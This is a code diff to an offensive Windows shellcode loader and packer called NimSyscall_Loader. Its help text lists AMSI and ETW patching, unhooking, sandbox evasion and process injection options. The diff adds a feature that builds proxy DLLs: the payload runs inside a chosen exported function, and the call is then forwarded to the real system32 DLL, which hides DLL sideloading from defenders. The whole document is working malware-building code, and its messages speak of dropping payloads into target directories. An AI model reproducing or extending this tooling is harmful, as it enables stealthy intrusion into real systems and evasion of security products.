@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -126,6 +126,8 @@ Options:
       --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
       --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
       --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
+          --payloadFunction funcName    The function to execute the Payload with to not use DllMain
+          --noRandom    Don't randomize the DLL-Name but forward to the original DLL instead (No need to copy the original DLL, only works for builtin windows DLLs)
       --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
       --xll    Generate an XLL file (Excel Add-In) instead of an executable
 
@@ -376,6 +378,8 @@ var
     noAntiEmulate: bool = false
     poolparty: int = 1
     usepoolparty: bool = false
+    noRandom: bool = false
+    payloadFunction: string = ""
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 2.2")
 
@@ -568,6 +572,13 @@ if args["--dllProxy"]:
   dllProxy = true
   dllhijack = true
   dll_out = true
+
+if args["--noRandom"]:
+  noRandom = true
+
+if args["--payloadFunction"]:
+  let payloadFunctionString = args["--payloadFunction"]
+  payloadFunction = fmt"{payloadFunctionString}"
 
 if args["--noNimMain"]:
   noNimMain = true
@@ -2966,13 +2977,15 @@ import perfecthijack
 
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  NimMain()
+  when not defined(payloadFunc):
+    NimMain()
 
   var ntdll: HMODULE = GetModuleHandleA("ntdll.dll")
   var LdrUnlockLoaderLock: FARPROC = GetProcAddress(ntdll, "LdrUnlockLoaderLock")
   var RtlExitUserProcess: FARPROC = GetProcAddress(ntdll, "RtlExitUserProcess")
   # go for magic
-  LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
+  when not defined(payloadFunc):
+      LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
       
   return true
 
@@ -2982,13 +2995,15 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  NimMain()
+  when not defined(payloadFunc):
+    NimMain()
   
   if fdwReason == DLL_PROCESS_ATTACH:
     NimMain()
     when defined(cloned):
-        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-        CloseHandle(threadHandle)
+        when not defined(payloadFunc):
+            var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+            CloseHandle(threadHandle)
   if fdwReason == DLL_THREAD_ATTACH:
     NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
@@ -3003,11 +3018,13 @@ import dynlib
 proc NimMain() {.cdecl, importc.}
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  NimMain()
+  when not defined(payloadFunc):
+    NimMain()
   
-  if fdwReason == DLL_PROCESS_ATTACH:
-    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-    CloseHandle(threadHandle)
+  when not defined(payloadFunc):
+    if fdwReason == DLL_PROCESS_ATTACH:
+      var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+      CloseHandle(threadHandle)
   #if fdwReason == DLL_THREAD_ATTACH:
   #  NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
@@ -3015,6 +3032,28 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
   return true
 
 """
+
+let DllCustomPayloadFuncStub = """
+
+type
+    functionType = proc (arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall.}
+
+proc {payloadFunction}Fwd(arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall,exportc, dynlib.} =
+    NimMain()
+    var return_value: uint64 = 0
+    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+    WaitForSingleObject(threadHandle, INFINITE)
+    # LoadLibraryA for PAYLOADDLL
+    var payloadDLL = LoadLibraryA("PAYLOADDLL")
+    # GetProcAddress for `{payloadFunction}`
+    var payloadFunction = GetProcAddress(payloadDLL, "{payloadFunction}")
+    # cast as 12 uint64 arguments and uint64 output
+    var payloadFunctionPtr = cast[functionType](payloadFunction)
+    # call the function
+    return_value = payloadFunctionPtr(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12)
+    return return_value
+"""
+
 
 let DllCustomExportStub = """
 proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
@@ -4101,6 +4140,10 @@ if (sleepycrypt):
 if(dll_out or cpl or xll):
     if (dllProxy):
         stub.add(DLLProxyStub)
+        # if custom payload function not empty, add DllCustomPayloadFuncStub
+        if (payloadFunction != ""):
+            var NewDllCustomPayloadFuncStub = DllCustomPayloadFuncStub.replace("{payloadFunction}", payloadFunction)
+            stub.add(NewDllCustomPayloadFuncStub)
     else:
         stub.add(DllStub)
         if(dllhijack):
@@ -4144,12 +4187,62 @@ if(dllProxy):
         echo fmt"No DLL files found in the {packerpath}/build/ folder. You need to put the legit DLL to proxy into this directory. Exiting..."
         quit(1)
     for dllpath in paths:
+        let (dir, dllName, ext) = splitFile(dllpath)
         when system.hostOS == "windows":
             echo os.execShellCmd(fmt"copy {dllpath} {packerpath}\\{randValue}.dll")
             echo os.execShellCmd(fmt"{packerpath}\\dllProxy\\gen_def.exe {randValue}.dll > {packerpath}/build/{randValue}.def")
+            if noRandom:
+                # remove the random dll name
+                echo os.execShellCmd(fmt"del {randValue}.dll")
+                # set output file name to dllName
+                outfile = dllName & ext
+                # Read {packerpath}/Loader.nim and replace PAYLOADDLL with the actual DLL name
+                var packstub = readFile("Loader.nim")
+                packstub = packstub.replace("PAYLOADDLL", fmt"C:\\windows\\system32\\{outfile}")
+                # Write the new Loader.nim
+                writeFile("Loader.nim", packstub)
+            else:
+                var packstub = readFile("Loader.nim")
+                packstub = packstub.replace("PAYLOADDLL", fmt"{randValue}.dll")
+                writeFile("Loader.nim", packstub)
+
         else:
             echo exec_cmd_ex(fmt"cp {dllpath} {packerpath}/{randValue}.dll")
             echo exec_cmd_ex(fmt"python {packerpath}/dllProxy/gen_def.py {randValue}.dll > {packerpath}/build/{randValue}.def")
+            if noRandom:
+                # remove the random dll name
+                echo exec_cmd_ex(fmt"rm {randValue}.dll")
+                outfile = dllName & ext
+                var packstub = readFile("Loader.nim")
+                packstub = packstub.replace("PAYLOADDLL", fmt"C:\windows\system32\{outfile}")
+                writeFile("Loader.nim", packstub)
+
+            else:
+                var packstub = readFile("Loader.nim")
+                packstub = packstub.replace("PAYLOADDLL", fmt"{randValue}.dll")
+                writeFile("Loader.nim", packstub)
+    # if payloadFunction != "", remove this function from the generated .def file. We just remove the whole line where it's defined
+    if (payloadFunction != ""):
+        var defFile: string = readFile(fmt"{packerpath}/build/{randValue}.def")
+        var lines: seq[string] = defFile.splitLines()
+        var newLines: seq[string] = @[]
+        var dllpath: string = paths[0]
+        let (dir, dllName, ext) = splitFile(dllpath)
+        for line in lines:
+            var newLine = line
+            if noRandom:
+                # replace the randValue in each line with the actual DLL name plus C:\windows\system32\ in front
+                newLine = line.replace(randValue, fmt"C:\windows\system32\{dllName}")
+                # replace C:\ with "C:\
+                newLine = newLine.replace("C:\\", "\"C:\\")
+                # replace whitespace + @ with ", but not if the line contains NimMain
+                if "NimMain" notin newLine:
+                    newLine = newLine.replace(" @", "\" @")
+            if payloadFunction in newLine:
+                # remove C:\windows\system32\ from the line
+                newLine = fmt"    {payloadFunction}={payloadFunction}Fwd"
+            newLines.add(newLine)
+        writeFile(fmt"{packerpath}/build/{randValue}.def", newLines.join("\n"))
 
 
 # --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
@@ -4290,6 +4383,10 @@ if (dllProxy):
     basicCompileFlags.add("--mm:none --threads:on ") # ORC breaks compilation with new anti Emulation checks
 
     basicCompileFlags.add("-d:proxy ")
+
+# if payloadFunction is not empty, add -d:payloadFunc
+if (payloadFunction != ""):
+    basicCompileFlags.add(fmt"-d:payloadFunc -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg ")
 
 if(service):
     basicCompileFlags.add("-d:service ")
@@ -4724,7 +4821,8 @@ if(exists):
         echo fmt"[!] Make sure to host the {outStringShellcode} file on your webserver with the correct filename to have a working payload ;-)"
 
     if (dllProxy):
-        echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+        if not noRandom:
+            echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
     
     if(scout):
         # Use donut again but this time with the outfile as input
@@ -4789,7 +4887,8 @@ else:
 
 if(useStego):
     echo "\r\n[*] The payload is saved in the image: " & stegofile & "\r\n"
-    echo "[*] You need to drop that image to the same directory as the loader to have a working payload ;-)"
+    if not noRandom:
+        echo "[*] You need to drop that image to the same directory as the loader to have a working payload ;-)"
 
 #[Here comes a function, that takes an string as input and pushes that into a char array ]#
 proc toByteSeq(s: string): seq[byte] =
